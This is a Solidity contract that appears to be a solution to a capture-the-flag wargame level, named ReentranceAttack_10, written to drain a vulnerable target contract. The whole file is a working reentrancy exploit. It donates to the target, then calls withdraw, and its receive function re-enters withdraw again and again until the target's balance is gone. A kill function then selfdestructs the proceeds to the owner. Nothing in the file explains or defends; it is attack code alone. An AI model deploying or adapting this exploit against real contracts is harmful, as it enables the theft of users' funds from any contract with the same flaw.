//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface ITarget {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack_10 {
    address public target;
    address payable public owner;
    ITarget public targetContract;

    constructor(address payable _target) payable {
        target = _target;
        targetContract = ITarget(target);
        owner = payable(msg.sender);
    }

    function attack() public payable {
        targetContract.donate{value: msg.value}(address(this));
        // with draw till target bleed
        targetContract.withdraw(msg.value);
    }

    function withdraw(uint256 _amount) public {
        targetContract.withdraw(_amount);
    }

    receive() external payable {
        uint256 withdrawAmount = target.balance > msg.value
            ? msg.value
            : target.balance;
        withdraw(withdrawAmount);
    }

    function kill() public {
        selfdestruct(owner);
    }
}
